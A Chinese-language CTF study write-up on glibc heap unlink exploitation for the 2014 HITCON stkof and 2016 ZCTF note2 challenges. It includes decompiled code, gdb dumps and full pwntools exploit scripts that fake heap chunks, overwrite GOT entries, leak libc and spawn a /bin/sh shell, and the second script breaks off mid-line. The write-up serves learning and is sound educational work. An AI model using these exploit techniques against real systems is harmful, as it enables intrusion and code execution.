<p>序言：这次进入到unlink的学习了，unlink在第一节已经用上了，但我用起来还不是很流畅，还是去翻了第一节的笔记，最主要是指针的问题，可能没学好指针，理解了unlink后就简单做了</p>
<h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol>
<li>几乎无输出的题目</li>
<li>申请功能，申请指定大小size</li>
<li>删除功能，删除idx位置处的chunk</li>
<li>输出一些无用字符串，有个strlen，本来想用来做/bin/sh的，发觉也不行</li>
<li>编辑功能</li>
</ol>
<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">fill</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  idx = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  size = atoll(&amp;s);</span><br><span class="line">  ptr = globals[idx];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, size, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, size, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fill函数里也就是编辑功能处可以自定大小编辑，也就是说存在堆溢出</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>这里有个小细节，自己补充下知识，关于缓冲区的问题，这个细节也解决了我自己出pwn题的时候输出，为什么输出不了的问题<br>就是如果未设置缓冲区为0的话，这道题里是第一次调用fgets是要先申请1024大小的堆块作为缓冲区的，还有printf也要申请1024大小的堆块作为缓冲区</p>
<p><a href="https://paper.seebug.org/450/" target="_blank" rel="noopener">知道创宇讲解的一道题目</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">ctf-wiki讲解这部分知识</a></p>
<ol>
<li>首先先申请一块内存，冲掉printf和fgets所需缓冲区</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">ptr = <span class="number">0x0000000000602140</span>+<span class="number">0x10</span></span><br><span class="line">alloc(<span class="number">0x100</span>) <span class="comment">#idx1</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>是unlink部分，当然用unlink方法来解了，第一节学过了，伪造一个chunk，然后通过溢出覆盖第二个堆块的pre_size和size，在free第二个堆块的时候就会unlink我们的伪造的p堆块</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x30</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x30</span>) <span class="comment">#idx4</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x20f7560-0x30</span><br><span class="line">0x20f7530:	0x0000000000000000	0x0000000000000041 <span class="comment">#chunk2</span></span><br><span class="line">0x20f7540:	0x0000000000000000	0x0000000000000030 <span class="comment">#p</span></span><br><span class="line">0x20f7550:	0x0000000000602138	0x0000000000602140</span><br><span class="line">0x20f7560:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f7570:	0x0000000000000030	0x0000000000000090 <span class="comment">#chunk3</span></span><br><span class="line">0x20f7580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f7590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>这里已经溢出覆盖掉chunk3的size了<br>其实unlink已经说过一次了，</p>
<ul>
<li>首先，第一步要过掉unlink的size检测，覆盖chunk3的pre_size为fake_chunk大小</li>
<li>其次chunk3的insue位要为0，标志前面一个堆块未在使用当中</li>
<li>然后关键点就是伪造fd跟bk了</li>
<li>在第一点中我将ptr设置为global+0x10意思就是第二块堆块地址，这就是存放p的地方 </li>
<li>unlink第一步 FD = p-&gt;fd = ptr-0x18</li>
<li>unlink第二步 BK=p-&gt;bk = ptr-0x10</li>
<li>unlink第三步 判断FD-&gt;bk == p &amp;&amp; BK-&gt;fd == p ?</li>
<li>过了检验后</li>
<li>FD-&gt;bk = * (ptr-0x18 + 0x18 )= BK = ptr -0x10</li>
<li>BK-&gt;fd = * (ptr-0x10+0x10) = FD = ptr-0x18<br>最终结果就是*ptr = ptr-0x18，而ptr是0x0000000000602150故最终就是将global+0x10处的值改为0x602138<br>然后我们在编辑第二块的时候实际上就是编辑0x602138处，也就是global-0x8处</li>
</ul>
<ol start="3">
<li>泄露地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(free_got)+p64(puts_got) + <span class="string">'a'</span>*<span class="number">8</span> + p64(atoi_got) <span class="comment">#这里对应的是第一块堆块，第二块，第三块和第四块</span></span><br><span class="line">fill(<span class="number">2</span>, payload) </span><br><span class="line">fill(<span class="number">1</span>,p64(puts_plt))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">io.success(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br></pre></td></tr></table></figure>
<p>没什么好说的啊，覆写got表为put泄露地址</p>
<ol start="4">
<li>最后我修改atoi为system，因为输入的会经过atoi转换，所以输入的就是system参数</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(io)</span><br><span class="line">fill(<span class="number">4</span>, p64(system_addr))</span><br><span class="line">io.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br></pre></td></tr></table></figure>




<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'stkof'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'stkof'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(len(content)))</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    ptr = <span class="number">0x0000000000602140</span>+<span class="number">0x10</span></span><br><span class="line">    <span class="comment">#for buffer</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x100</span>) <span class="comment">#idx1   </span></span><br><span class="line">    alloc(<span class="number">0x30</span>) <span class="comment">#idx2</span></span><br><span class="line">    alloc(<span class="number">0x80</span>) <span class="comment">#idx3</span></span><br><span class="line">    alloc(<span class="number">0x30</span>) <span class="comment">#idx4</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    fill(<span class="number">2</span>, payload)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">    payload += p64(free_got)+p64(puts_got) + <span class="string">'a'</span>*<span class="number">8</span> + p64(atoi_got)</span><br><span class="line">    fill(<span class="number">2</span>, payload) </span><br><span class="line">    fill(<span class="number">1</span>,p64(puts_plt))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    io.success(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">    </span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    fill(<span class="number">4</span>, p64(system_addr))</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">ctf-wiki讲解</a></p>
<p>我只讲差异，里面有的我就不讲了，我只发现了这个漏洞点<br>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。<br>然后我并不会利用这个，本来想利用chunk extends上一节学的，发觉他free后的大小不怎么对，到时看下源码吧，他free后的chunk大小不是合并后的大小，最后看到了大佬讲解的那个0，然后通过-1转成无符号整数，这个我自己查看的时候看不出</p>
<h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>第一步构造unlink，原理上一节弄过了，所以感觉这次顺畅好多</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x0000000000602120</span> </span><br><span class="line">first()</span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa0</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'a'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, payload)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>unlink过后修改ptr[0]指针，指向atoi的got表，泄露地址，为什么指向atoi?为后面做准备</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, payload) </span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">"TheNewContents:Edit note success!\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Content is "</span>)</span><br><span class="line">atoi_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"atoi_addr: 0x%x"</span> % atoi_addr)</span><br><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br></pre></td></tr></table></figure>

<p>getshell,因为此时第一块堆块还指向atoi的got表，所以此时编辑下，就可以覆写got表了，输入的时候会将输入串atoi，所以就成为参数了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get_shell</span></span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, p64(system_addr))</span><br><span class="line">io.sendline(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure>



<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'note2'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'note2'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(idx, choice, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Input your name:\n"</span>, <span class="string">"greenhand"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your address:\n"</span>, <span class="string">"greenhand"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x0000000000602120</span> </span><br><span class="line">    first()</span><br><span class="line">    <span class="comment"># unlink</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa0</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) </span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'a'</span>)</span><br><span class="line">    newnote(<span class="number">0x80</span>, payload)</span><br><span class="line">    newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line">    newnote(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span 